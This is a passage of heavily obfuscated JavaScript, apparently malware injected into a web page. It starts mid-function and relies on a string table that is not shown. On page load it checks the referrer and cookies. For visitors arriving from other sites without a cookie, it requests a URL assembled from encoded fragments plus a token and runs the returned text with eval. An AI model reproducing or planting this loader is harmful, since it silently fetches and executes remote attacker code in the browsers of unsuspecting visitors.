V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};